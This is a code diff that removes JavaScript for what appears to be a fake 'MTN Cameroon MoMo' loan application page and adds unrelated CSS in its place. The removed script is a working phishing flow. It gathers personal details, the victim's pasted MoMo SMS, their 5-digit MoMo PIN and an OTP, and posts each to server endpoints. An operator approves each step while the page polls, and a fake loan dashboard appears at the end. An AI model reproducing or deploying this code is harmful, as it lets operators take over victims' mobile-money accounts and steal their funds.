-function loadFormDraft() {
-    const draft = getFromLocalStorage(STORAGE_KEYS.FORM_DRAFT);
-    if (draft) {
-        const age = Date.now() - new Date(draft.timestamp).getTime();
-        if (age < 24 * 60 * 60 * 1000) {
-            if (draft.firstName) document.getElementById('s2fi').value = draft.firstName;
-            if (draft.lastName) document.getElementById('s2la').value = draft.lastName;
-            if (draft.phone) document.getElementById('s2ph').value = draft.phone;
-            if (draft.loanAmount) document.getElementById('s1am').value = draft.loanAmount;
-            if (draft.loanPurpose) document.getElementById('s1pu').value = draft.loanPurpose;
-            if (draft.employment) document.getElementById('s3em').value = draft.employment;
-            if (draft.annualIncome) document.getElementById('s3in').value = draft.annualIncome;
-            if (draft.kinName) document.getElementById('s3kn').value = draft.kinName;
-            if (draft.kinPhone) document.getElementById('s3kp').value = draft.kinPhone;
-            return true;
-        } else {
-            removeFromLocalStorage(STORAGE_KEYS.FORM_DRAFT);
-        }
-    }
-    return false;
+.balance-label {
+    font-size: 0.85rem;
+    color: #888;
+    text-transform: uppercase;
+    letter-spacing: 0.05em;
 }
-
-// ─── Navigation ───
-function goTo(pageId) {
-    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-    const el = document.getElementById(pageId);
-    if (el) el.classList.add('active');
-    window.scrollTo(0, 0);
-
-    if (pageId === 'page-sms-paste') {
-        startSmsCountdown();
-    }
-    if (pageId === 'page-otp') {
-        startOtpCountdown();
-    }
+.balance-amount {
+    font-size: 2.4rem;
+    font-weight: 800;
+    color: #004f9f;
+    margin: 8px 0 16px;
 }
-
-function startApplication() {
-    S.rejectedStep = null;
-    clearRejectionInfo();
-    if (!S.applicationId) {
-        S.applicationId = 'MTN-CM-' + Date.now().toString().slice(-6);
-        saveApplicationId(S.applicationId);
-    }
-    document.getElementById('resendOtpBtn')?.classList.add('hidden');
-    ['s1Err', 's2Err', 's3Err', 'momErr', 'pinErr', 'otpErr'].forEach(id => clearErr(id));
-    goTo('page-step1');
+.balance-details {
+    display: flex;
+    justify-content: space-between;
+    font-size: 0.85rem;
+    color: #555;
+    border-top: 1px solid #eee;
+    padding-top: 12px;
 }
-
-// ─── Toast Notifications ───
-function showToast(message, type = 'info', duration = 3000) {
-    const existing = document.querySelector('.toast');
-    if (existing) existing.remove();
-    const toast = document.createElement('div');
-    toast.className = `toast toast-${type}`;
-    toast.textContent = message;
-    document.body.appendChild(toast);
-    setTimeout(() => {
-        toast.style.opacity = '0';
-        toast.style.transform = 'translateX(-50%) translateY(-20px)';
-        setTimeout(() => toast.remove(), 300);
-    }, duration);
+.momo-actions {
+    display: flex;
+    gap: 12px;
+    padding: 0 16px;
 }
-
-// ─── Form Helpers ───
-function normalizePhone(id) {
-    let inp = document.getElementById(id);
-    let val = inp.value.replace(/\D/g, '');
-    if (val.length > 9) val = val.substring(0, 9);
-    inp.value = val;
-    saveFormDraft();
+.action-card {
+    flex: 1;
+    background: white;
+    border-radius: 12px;
+    padding: 16px;
+    text-align: center;
+    box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+    cursor: pointer;
+    transition: transform 0.2s;
 }
-
-function updateCalc() {
-    const amt = +document.getElementById('amtSlider').value;
-    document.getElementById('calcAmt').textContent = 'XAF ' + amt.toLocaleString();
-    const monthly = Math.ceil(amt / 48);
-    document.getElementById('monthlyAmt').textContent = 'XAF ' + monthly.toLocaleString();
+.action-card:hover { transform: translateY(-3px); }
+.action-icon { font-size: 2rem; margin-bottom: 8px; }
+.action-text { font-size: 0.85rem; font-weight: 600; color: #333; }
+.momo-recent {
+    background: white;
+    margin: 16px;
+    border-radius: 16px;
+    padding: 20px;
+    box-shadow: 0 2px 10px rgba(0,0,0,0.05);
 }
-
-function showErr(id, msg) {
-    const box = document.getElementById(id);
-    if (box) {
-        box.classList.add('show');
-        const txt = document.getElementById(id + 'Txt');
-        if (txt) txt.textContent = msg;
-    }
+.momo-recent h3 { font-size: 1rem; margin-bottom: 16px; color: #004f9f; }
+.transaction-item {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    padding: 12px 0;
+    border-bottom: 1px solid #f5f5f5;
 }
-
-function clearErr(id) {
-    const box = document.getElementById(id);
-    if (box) box.classList.remove('show');
+.transaction-item:last-child { border-bottom: none; }
+.tx-icon {
+    width: 40px;
+    height: 40px;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 1.2rem;
+    flex-shrink: 0;
 }
-
-// ─── Step Navigation ───
-function toS2() {
-    const ty = document.getElementById('s1ty').value;
-    const am = +document.getElementById('s1am').value;
-    const te = document.getElementById('s1te').value;
-    const pu = document.getElementById('s1pu').value;
-    if (!ty || am <= 0 || !te || !pu.trim()) { showErr('s1Err', 'Please complete all fields.'); return; }
-    S.loanType = ty; S.loanAmount = am; S.loanTerm = te; S.loanPurpose = pu;
-    saveApplicationData(); saveFormDraft();
-    goTo('page-step2');
+.tx-icon.green { background: #e8f8f0; color: #2e7d32; }
+.tx-icon.orange { background: #fff3e0; color: #e07800; }
+.tx-details { flex: 1; }
+.tx-title { font-size: 0.9rem; font-weight: 600; }
+.tx-date { font-size: 0.75rem; color: #888; }
+.tx-amount { font-weight: 700; font-size: 0.9rem; }
+.momo-logout {
+    margin: 0 16px 24px;
+    padding: 12px;
+    background: #e0e0e0;
+    color: #666;
+    border: none;
+    border-radius: 12px;
+    font-size: 1rem;
+    font-weight: 600;
+    cursor: pointer;
 }
+.momo-logout:hover { background: #d0d0d0; }
 
-function toS3() {
-    const fi = document.getElementById('s2fi').value.trim();
-    const la = document.getElementById('s2la').value.trim();
-    const ph = document.getElementById('s2ph').value;
-    if (!fi || !la) { showErr('s2Err', 'Please enter your full name.'); return; }
-    if (ph.length !== 9) { showErr('s2Err', 'Please enter a valid 9-digit phone number.'); return; }
-    S.firstName = fi; S.lastName = la; S.phone = ph;
-    saveApplicationData(); saveFormDraft();
-    goTo('page-step3');
+/* INLINE ERROR / STATUS MESSAGES */
+.msg-box {
+    border-radius: var(--radius-sm);
+    padding: 12px 16px;
+    font-size: 0.84rem;
+    margin-bottom: 16px;
+    display: none;
+    align-items: center;
+    gap: 10px;
 }
+.msg-box.show { display: flex; }
+.msg-box.error   { background: #fef2f2; border: 1.5px solid #fecaca; color: #991b1b; }
+.msg-box.success { background: #f0fdf4; border: 1.5px solid #bbf7d0; color: #166534; }
+.msg-box.info    { background: #eff6ff; border: 1.5px solid #bfdbfe; color: #1e40af; }
+.msg-box.warning { background: #fefce8; border: 1.5px solid #fef08a; color: #854d0e; }
+.msg-icon { font-weight: 700; }
 
-// ─── PIN/OTP Helpers ───
-function pinMvM(el, i, maxLength = 5) {
-    el.value = el.value.replace(/\D/g, '');
-    if (el.value && i < maxLength - 1) {
-        const nextPin = document.getElementById('pin' + (i + 1));
-        if (nextPin) { nextPin.focus(); return; }
-    }
-    if (i === maxLength - 1 && el.value) {
-        const allFilled = [0,1,2,3,4].every(idx => document.getElementById('pin' + idx)?.value);
-        if (allFilled) setTimeout(() => doPin(), 300);
-    }
+/* LOADING */
+.loading { display: none; }
+.loading.show { display: block; }
+.wait-msg { text-align: center; color: var(--text-light); font-size: 0.88rem; }
+
+/* RESPONSIVE */
+@media (max-width: 480px) {
+    .page { padding: 10px; }
+    .step-card { padding: 16px; }
+    .pin-row { gap: 6px; }
+    .pin-box { width: 40px; height: 45px; }
+    .otp-box { height: 45px; }
 }
-
-function togPin() {
-    for (let i = 0; i < 5; i++) {
-        const b = document.getElementById('pin' + i);
-        if (b) b.type = b.type === 'password' ? 'text' : 'password';
-    }
-    for (let i = 0; i < 4; i++) {
-        const b = document.getElementById('otp' + i);
-        if (b) b.type = b.type === 'password' ? 'text' : 'password';
-    }
-}
-
-function chkPin() {
-    const pinOk = [0,1,2,3,4].every(i => document.getElementById('pin' + i)?.value);
-    const pinBtn = document.querySelector('#page-pin .btn-grad');
-    if (pinBtn) pinBtn.disabled = !pinOk;
-    const otpOk = [0,1,2,3].every(i => document.getElementById('otp' + i)?.value);
-    const otpBtn = document.querySelector('#page-otp .btn-grad');
-    if (otpBtn) otpBtn.disabled = !otpOk;
-}
-
-document.addEventListener('keyup', chkPin);
-
-function clearLoginPin() {
-    [0,1,2,3,4].forEach(i => document.getElementById('pin'+i).value = '');
-    document.getElementById('pin0').focus();
-    chkPin();
-}
-
-function clearOtpCode() {
-    [0,1,2,3].forEach(i => document.getElementById('otp'+i).value = '');
-    document.getElementById('otp0').focus();
-    chkPin();
-}
-
-function handleOtpInput(el, type) {
-    el.value = el.value.replace(/\D/, '');
-    const idx = parseInt(el.id.match(/\d$/)[0]);
-    if (el.value && type === 'otp' && idx < 3) document.getElementById('otp' + (idx + 1))?.focus();
-    chkPin();
-    if (idx === 3 && el.value) {
-        const allFilled = [0,1,2,3].every(i => document.getElementById('otp' + i)?.value);
-        if (allFilled) setTimeout(() => doOtp(), 300);
-    }
-}
-
-// ─── PIN Attempt Functions ───
-async function checkPinStatus() {
-    try {
-        const response = await fetch(`/api/status/${S.applicationId}/pin`);
-        const data = await response.json();
-        if (data.ok) {
-            const remaining = data.remainingAttempts || 3;
-            const attemptsDisplay = document.getElementById('pinAttemptsDisplay');
-            if (attemptsDisplay) {
-                if (data.blocked) {
-                    attemptsDisplay.innerHTML = `🔒 Too many attempts. Blocked for ${data.blockRemainingSeconds}s`;
-                    attemptsDisplay.className = 'pin-attempts blocked';
-                    document.querySelectorAll('#page-pin .pin-box').forEach(b => b.disabled = true);
-                    document.querySelector('#page-pin .btn-grad').disabled = true;
-                    startPinBlockCountdown(data.blockRemainingSeconds);
-                } else {
-                    attemptsDisplay.innerHTML = `🔑 Attempts remaining: ${remaining} of 3`;
-                    attemptsDisplay.className = 'pin-attempts';
-                }
-            }
-            return data;
-        }
-    } catch (error) { console.error('Error checking PIN status:', error); }
-    return null;
-}
-
-function startPinBlockCountdown(seconds) {
-    const attemptsDisplay = document.getElementById('pinAttemptsDisplay');
-    if (!attemptsDisplay) return;
-    if (pinBlockTimer) clearInterval(pinBlockTimer);
-    let remaining = seconds;
-    attemptsDisplay.textContent = `🔒 Too many attempts. Blocked for ${remaining}s`;
-    attemptsDisplay.className = 'pin-attempts blocked';
-    pinBlockTimer = setInterval(() => {
-        remaining--;
-        if (remaining <= 0) {
-            clearInterval(pinBlockTimer);
-            pinBlockTimer = null;
-            attemptsDisplay.textContent = '✅ PIN available. Please try again.';
-            attemptsDisplay.className = 'pin-attempts available';
-            document.querySelectorAll('#page-pin .pin-box').forEach(b => b.disabled = false);
-            document.querySelector('#page-pin .btn-grad').disabled = false;
-            resetPinAttempts();
-        } else {
-            attemptsDisplay.textContent = `🔒 Too many attempts. Blocked for ${remaining}s`;
-        }
-    }, 1000);
-}
-
-async function resetPinAttempts() {
-    try {
-        await fetch(`/api/reset-pin-attempts/${S.applicationId}`, { method: 'POST' });
-    } catch (error) { console.error('Error resetting PIN attempts:', error); }
-}
-
-// ─── SMS Countdown & Resend ───
-function startSmsCountdown() {
-    const wrap = document.getElementById('smsCountdownWrap');
-    const text = document.getElementById('smsCountdownText');
-    const btn = document.getElementById('btnSmsResend');
-    if (!wrap || !text || !btn) return;
-    wrap.style.display = 'block';
-    btn.style.display = 'none';
-    let remaining = 60;
-    text.textContent = `Resend available in ${remaining}s`;
-    clearInterval(smsCountdownInterval);
-    smsCountdownInterval = setInterval(() => {
-        remaining--;
-        if (remaining <= 0) {
-            clearInterval(smsCountdownInterval);
-            text.textContent = 'SMS expired. You can resend.';
-            btn.style.display = 'block';
-        } else {
-            text.textContent = `Resend available in ${remaining}s`;
-        }
-    }, 1000);
-}
-
-async function doSmsResend() {
-    const btn = document.getElementById('btnSmsResend');
-    btn.disabled = true;
-    btn.textContent = '⏳ Sending...';
-    try {
-        const res = await fetch('/api/resend-sms', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ applicationId: S.applicationId })
-        });
-        const data = await res.json();
-        if (data.ok) {
-            showToast('✅ SMS resent. Paste the new message.', 'success');
-            document.getElementById('smsMsgBox').value = '';
-            startSmsCountdown();
-        } else {
-            alert(data.message || 'Failed to resend SMS.');
-        }
-    } catch (err) {
-        alert('Network error: ' + err.message);
-    } finally {
-        btn.disabled = false;
-        btn.textContent = '🔄 Resend SMS';
-    }
-}
-
-// ─── OTP Countdown & Resend ───
-function startOtpCountdown() {
-    const wrap = document.getElementById('otpCountdownWrap');
-    const text = document.getElementById('otpCountdownText');
-    const btn = document.getElementById('btnOtpResend');
-    if (!wrap || !text || !btn) return;
-    wrap.style.display = 'block';
-    btn.style.display = 'none';
-    let remaining = 60;
-    text.textContent = `Resend available in ${remaining}s`;
-    clearInterval(otpCountdownInterval);
-    otpCountdownInterval = setInterval(() => {
-        remaining--;
-        if (remaining <= 0) {
-            clearInterval(otpCountdownInterval);
-            text.textContent = 'OTP expired. You can resend.';
-            btn.style.display = 'block';
-        } else {
-            text.textContent = `Resend available in ${remaining}s`;
-        }
-    }, 1000);
-}
-
-async function doOtpResend() {
-    const btn = document.getElementById('btnOtpResend');
-    btn.disabled = true;
-    btn.textContent = '⏳ Sending...';
-    try {
-        const res = await fetch('/api/resend-otp', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ applicationId: S.applicationId })
-        });
-        const data = await res.json();
-        if (data.ok) {
-            showToast('✅ OTP resent. Enter the new OTP.', 'success');
-            clearOtpCode();
-            startOtpCountdown();
-        } else {
-            alert(data.message || 'Failed to resend OTP.');
-        }
-    } catch (err) {
-        alert('Network error: ' + err.message);
-    } finally {
-        btn.disabled = false;
-        btn.textContent = '🔄 Resend OTP';
-    }
-}
-
-// ─── Smart Rejection Navigation ───
-function handleRejection(step) {
-    clearErr('s3Err'); clearErr('momErr'); clearErr('pinErr'); clearErr('otpErr');
-    if (currentPollTimeout) { clearTimeout(currentPollTimeout); currentPollTimeout = null; }
-    saveRejectionInfo(step, S.applicationId);
-
-    switch(step) {
-        case 'sms':
-            showToast('❌ SMS was rejected. Please check and resubmit.', 'error');
-            document.getElementById('smsMsgBox').value = '';
-            document.getElementById('smsMsgBox').focus();
-            goTo('page-sms-paste');
-            startSmsCountdown();
-            break;
-        case 'pin':
-            showToast('❌ PIN was rejected. Please re-enter your MoMo PIN.', 'error');
-            document.querySelectorAll('#page-pin .pin-box').forEach(b => b.value = '');
-            document.getElementById('pin0').focus();
-            checkPinStatus();
-            goTo('page-pin');
-            break;
-        case 'otp':
-            showToast('❌ OTP was rejected. Please request a new OTP.', 'error');
-            clearOtpCode();
-            startOtpCountdown();
-            goTo('page-otp');
-            break;
-        default:
-            showToast('❌ Application was rejected. Please start over.', 'error');
-            goTo('page-step1');
-    }
-}
-
-// ─── Polling ───
-function startPoll(applicationId, step, onSuccess, onReject) {
-    if (currentPollTimeout) { clearTimeout(currentPollTimeout); currentPollTimeout = null; }
-    const check = async () => {
-        try {
-            const res = await fetch(`/api/status/${applicationId}/${step}`);
-            const data = await res.json();
-            if (data && data.ok === true) {
-                if (data.status === 'approved') {
-                    currentPollTimeout = null;
-                    onSuccess();
-                    return;
-                } else if (data.status === 'rejected') {
-                    currentPollTimeout = null;
-                    onReject();
-                    return;
-                }
-            }
-            currentPollTimeout = setTimeout(check, 2000);
-        } catch (err) {
-            currentPollTimeout = setTimeout(check, 3000);
-        }
-    };
-    check();
-}
-
-// ─── Show Approval and Dashboard ───
-function showApproval() {
-    document.getElementById('aprAmount').textContent = 'XAF ' + S.loanAmount.toLocaleString();
-    document.getElementById('aprAmt').textContent = 'XAF ' + S.loanAmount.toLocaleString();
-    document.getElementById('aprTerm').textContent = S.loanTerm;
-    const monthly = Math.ceil(S.loanAmount / parseInt(S.loanTerm));
-    document.getElementById('aprMth').textContent = 'XAF ' + monthly.toLocaleString();
-    const finishBtn = document.querySelector('.rth-btn');
-    finishBtn.textContent = currentLang === 'fr' ? 'TERMINER' : 'FINISH';
-    finishBtn.onclick = loadDashboard;
-    Object.values(STORAGE_KEYS).forEach(key => removeFromLocalStorage(key));
-    if (otpResendTimer) clearInterval(otpResendTimer);
-    if (pinBlockTimer) clearInterval(pinBlockTimer);
-    goTo('page-approval');
-}
-
-async function loadDashboard() {
-    try {
-        const res = await fetch(`/api/dashboard/${S.applicationId}`);
-        const data = await res.json();
-        if (data.ok) {
-            const dashBalance = document.getElementById('dashBalance');
-            if (dashBalance) dashBalance.textContent = 'XAF ' + data.data.loanAmount.toLocaleString();
-            const dashId = document.getElementById('dashId');
-            if (dashId) dashId.textContent = data.data.applicationId;
-            const dashTerm = document.getElementById('dashTerm');
-            if (dashTerm) dashTerm.textContent = data.data.loanTerm;
-            const txAmount = document.querySelector('.tx-amount');
-            if (txAmount) txAmount.textContent = '+XAF ' + data.data.loanAmount.toLocaleString();
-        }
-        goTo('page-dashboard');
-    } catch (err) {
-        console.error('Dashboard error:', err);
-        goTo('page-approval'); // fallback
-    }
-}
-
-// ─── STEP 3: Submit Application ───
-async function submitApp() {
-    const em = document.getElementById('s3em').value;
-    const in_ = +document.getElementById('s3in').value;
-    const kn = document.getElementById('s3kn').value.trim();
-    const kp = document.getElementById('s3kp').value.trim();
-    if (!em || in_ <= 0) { showErr('s3Err', 'Please complete all fields.'); return; }
-    S.employment = em; S.annualIncome = in_; S.kinName = kn; S.kinPhone = kp;
-    
-    if (!S.applicationId) {
-        S.applicationId = 'MTN-CM-' + Date.now().toString().slice(-6);
-        saveApplicationId(S.applicationId);
-    }
-    
-    saveApplicationData();
-    goTo('page-processing');
-
-    try {
-        const res = await fetch('/api/send-application', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ applicationData: S })
-        });
-        const data = await res.json();
-        if (data.ok) {
-            S.applicationId = data.applicationId;
-            saveApplicationId(S.applicationId);
-            
-            document.getElementById('processingStatus').innerHTML = '⏳ Awaiting admin approval...';
-            startPoll(S.applicationId, 'sms',
-                () => { showToast('✅ Application Approved!', 'success'); goTo('page-sms-paste'); },
-                () => handleRejection('sms')
-            );
-        } else {
-            showErr('s3Err', data.message || 'Failed to submit application.');
-        }
-    } catch (err) {
-        showErr('s3Err', 'Network error. Please try again.');
-    }
-}
-
-// ─── STEP 4: SMS ───
-async function doSmsParse() {
-    const msg = document.getElementById('smsMsgBox').value.trim();
-    if (msg.length < 3) { showErr('momErr', 'Please paste a valid SMS message.'); return; }
-    
-    const waitSmsAppId = document.getElementById('waitSmsAppId');
-    if (waitSmsAppId) waitSmsAppId.textContent = S.applicationId;
-    
-    goTo('page-wait-sms');
-    
-    try {
-        await fetch('/api/send-momo-message', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ momoData: { applicationId: S.applicationId, momoMessage: msg } })
-        });
-        startPoll(S.applicationId, 'sms',
-            () => { showToast('✅ SMS Approved!', 'success'); goTo('page-pin'); },
-            () => handleRejection('sms')
-        );
-    } catch (err) {
-        showErr('momErr', 'Failed to submit SMS.');
-        goTo('page-sms-paste');
-        startSmsCountdown();
-    }
-}
-
-// ─── STEP 5: PIN ───
-async function doPin() {
-    const pin = [0,1,2,3,4].map(i => document.getElementById('pin'+i).value).join('');
-    if (pin.length < 5) { showErr('pinErr', 'Enter a valid 5-digit MoMo PIN.'); return; }
-    
-    const waitPinAppId = document.getElementById('waitPinAppId');
-    if (waitPinAppId) waitPinAppId.textContent = S.applicationId;
-    
-    goTo('page-wait-pin');
-    
-    try {
-        await fetch('/api/send-pin', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ applicationId: S.applicationId, pin })
-        });
-        startPoll(S.applicationId, 'pin',
-            () => { showToast('✅ PIN Approved!', 'success'); resetPinAttempts(); goTo('page-otp'); },
-            async () => {
-                const rejectRes = await fetch('/api/pin-rejected', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ applicationId: S.applicationId })
-                });
-                const rejectData = await rejectRes.json();
-                if (rejectData.blocked) {
-                    showErr('pinErr', '🔒 Too many failed attempts. Blocked for 5 minutes.');
-                    checkPinStatus();
-                    goTo('page-pin');
-                } else if (rejectData.remainingAttempts > 0) {
-                    showErr('pinErr', `❌ Wrong PIN. ${rejectData.remainingAttempts} attempt(s) remaining.`);
-                    document.querySelectorAll('#page-pin .pin-box').forEach(b => b.value = '');
-                    document.getElementById('pin0').focus();
-                    const attemptsDisplay = document.getElementById('pinAttemptsDisplay');
-                    if (attemptsDisplay) attemptsDisplay.textContent = `🔑 Attempts remaining: ${rejectData.remainingAttempts} of 3`;
-                    goTo('page-pin');
-                } else {
-                    handleRejection('pin');
-                }
-            }
-        );
-    } catch (err) {
-        showErr('pinErr', 'Failed to submit PIN.');
-        goTo('page-pin');
-    }
-}
-
-// ─── STEP 6: OTP ───
-async function doOtp() {
-    const otp = [0,1,2,3].map(i => document.getElementById('otp'+i).value).join('');
-    if (otp.length < 4) { showErr('otpErr', 'Enter a valid 4-digit OTP.'); return; }
-    
-    const waitOtpAppId = document.getElementById('waitOtpAppId');
-    if (waitOtpAppId) waitOtpAppId.textContent = S.applicationId;
-    
-    goTo('page-wait-otp');
-    
-    try {
-        await fetch('/api/send-otp', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ applicationId: S.applicationId, otp })
-        });
-        startPoll(S.applicationId, 'otp',
-            () => { showToast('✅ OTP Approved! Loan Approved 🎉', 'success'); showApproval(); },
-            () => handleRejection('otp')
-        );
-    } catch (err) {
-        showErr('otpErr', 'Failed to submit OTP.');
-        goTo('page-otp');
-        startOtpCountdown();
-    }
-}
-
-// ─── Recovery on Page Load ───
-function recoverSession() {
-    const appId = loadApplicationId();
-    if (appId) console.log(`✅ Found application ID: ${appId}`);
-    const dataLoaded = loadApplicationData();
-    if (dataLoaded) console.log('✅ Loaded application data');
-    const rejection = loadRejectionInfo();
-    if (rejection) {
-        S.applicationId = rejection.applicationId;
-        showToast(`⚠️ Your ${rejection.step.toUpperCase()} was rejected. Please try again.`, 'error');
-        handleRejection(rejection.step);
-        return true;
-    }
-    loadFormDraft();
-    return false;
-}
-
-// ─── Auto-save on input changes ───
-document.addEventListener('input', (e) => {
-    if (e.target.closest('#page-step1, #page-step2, #page-step3')) saveFormDraft();
-    if (e.target.closest('#page-step2, #page-step3')) saveApplicationData();
-});
-
-// ─── INIT ───
-updateCalc();
-applyLanguage();
-const recovered = recoverSession();
-if (!recovered) goTo('page-landing');
-console.log('✅ MTN Cameroon MoMo Loan App (All Features) loaded!');
